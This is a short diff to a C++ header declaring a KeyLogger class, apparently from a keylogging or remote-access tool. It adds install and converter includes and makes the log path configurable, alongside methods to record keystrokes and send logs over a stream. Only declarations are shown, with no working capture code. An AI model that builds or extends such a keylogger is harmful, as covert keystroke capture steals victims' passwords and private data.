@@ -10,13 +10,15 @@
 
 #include "../stream/Stream.h"
 #include "../Time/Time.h"
+#include "../install/Install.h"
+#include "../converter/Converter.h"
 
 
 
 class KeyLogger {
 
 public:
-    explicit KeyLogger(Stream stream);
+    explicit KeyLogger(Stream stream,const std::string&);
     bool isRecordingKeys() const;
     void setRecordingKeys(bool isRecording);
     void sendKeyLoggerLog();
@@ -26,7 +28,7 @@ public:
     void tryStart();
 private:
     void start();
-    const std::wstring pathOfLogs= L"Logs/";
+    const std::wstring pathOfLogs;
     std::wstring logsFileName= generateLogName();
     Stream stream;
     std::atomic<bool> recordingKeys = false;
